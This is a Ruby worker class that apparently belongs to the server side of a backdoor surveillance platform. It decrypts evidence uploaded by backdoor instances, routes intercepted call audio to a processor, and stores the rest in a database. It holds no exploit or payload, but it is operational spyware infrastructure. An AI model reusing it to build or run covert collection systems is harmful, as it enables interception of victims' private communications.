require_relative 'audio_processor'

# from RCS::Common
require 'rcs-common/trace'
require 'rcs-common/evidence'
require 'rcs-common/evidence_manager'

require 'rcs-db/db_layer'

module RCS
module Worker

class InstanceProcessor
  include RCS::Tracer
  
  SLEEP_TIME = 10
  
  def initialize(id)
    @id = id
    @evidences = []
    @state = :stopped
    @seconds_sleeping = 0
    
    # get info about the backdoor instance from evidence db
    @info = RCS::EvidenceManager.instance_info @id
    raise "Instance \'#{@id}\' cannot be found." if @info.nil?
    
    trace :info, "Created processor for backdoor #{@info['build']}:#{@info['instance']}"
    
    # the log key is passed as a string taken from the db
    # we need to calculate the MD5 and use it in binary form
    trace :debug, "Evidence key #{@info['key']}"
    @key = Digest::MD5.digest @info['key']
    
    @audio_processor = AudioProcessor.new
  end
  
  def resume
    @state = :running
    RCS::EvidenceManager.sync_status({:instance => @info['instance']}, RCS::EvidenceManager::SYNC_PROCESSING)
    @seconds_sleeping = 0
  end
  
  def take_some_rest
    sleep 1
    @seconds_sleeping += 1
    trace :debug, "[#{Thread.current}][#{@id}] sleeping some [#{@seconds_sleeping}]."
  end
  
  def put_to_sleep
    @state = :stopped
    RCS::EvidenceManager.sync_status({:instance => @info['instance']}, RCS::EvidenceManager::SYNC_IDLE)
    trace :debug, "[#{Thread.current}][#{@id}] sleeping too much, let's stop!"
  end
  
  def stopped?
    @state == :stopped
  end
  
  def sleeping_too_much?
    @seconds_sleeping >= SLEEP_TIME
  end
  
  def queue(id)
    @evidences << id unless id.nil?
    trace :info, "queueing #{id} for #{@id}"
    
    process = Proc.new do
      resume

      until sleeping_too_much?
        until @evidences.empty?
          resume
          evidence_id = @evidences.shift
          
          begin
            # get evidence and deserialize it
            data = RCS::EvidenceManager.get_evidence(evidence_id, @id)
            evidence = RCS::Evidence.new(@key).deserialize(data)
            
            # find correct processing module and extend evidence
            mod = "#{evidence.type.to_s.capitalize}Processing"
            evidence.extend eval mod if RCS.const_defined? mod.to_sym
            
            evidence.process if evidence.respond_to? :process
            
            case evidence.info[:type]
              when :CALL
                @audio_processor.feed(evidence)
              else
                done = false
                until done
                  begin
                    evidence.info[:backdoor_id] = RCS::EvidenceManager.instance_info(@id)["bid"]
                    RCS::DB::DB.evidence_store(evidence)
                    RCS::EvidenceManager.del_evidence(evidence_id, @id)
                    done = true
                  rescue Exception => e
                    trace :debug, "[#{Thread.current}][#{@id}] DB seems down, waiting for it to resume ... [#{e.message}]"
                    sleep 1
                  end
                end
            end
            
            trace :debug, "[#{Thread.current}][#{@id}] processed #{evidence_id} of type #{evidence.info[:type]}, #{data.size} bytes."
          
          rescue EvidenceDeserializeError => e
            trace :info, "[#{Thread.current}][#{@id}] decoding failed for #{evidence_id}: " << e.to_s
            # trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
          rescue Exception => e
            trace :fatal, "FAILURE: " << e.to_s
            trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
          end
        end
        take_some_rest
      end
      
      put_to_sleep
    end
    
    if stopped?
      trace :debug, "deferring work for #{@id}"
      EM.defer process
    end
  end
  
  def to_s
    "instance #{@id}: #{@evidences}"
  end
end

end # ::Worker
end # ::RCS